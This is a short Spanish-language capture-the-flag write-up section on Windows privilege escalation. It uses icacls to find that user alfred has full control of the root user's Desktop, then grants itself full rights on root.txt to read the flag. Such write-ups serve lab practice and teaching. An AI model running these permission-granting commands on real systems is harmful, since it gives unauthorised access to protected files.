## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami /priv
cd Desktop
type root.txt
```

No podemos leer la flag de root pero es curioso que nos podamos meter en su directorio user.

```bash
icacls root.txt
cd ..
icacls Desktop
```

Vemos que el usuario alfred tiene privilegios Full sobre el directorio Desktop del usuario root.

```bash
cd Desktop
icacls root.txt /grant alfred:F
type root.txt
```

Podemos leer la flag, lol :)
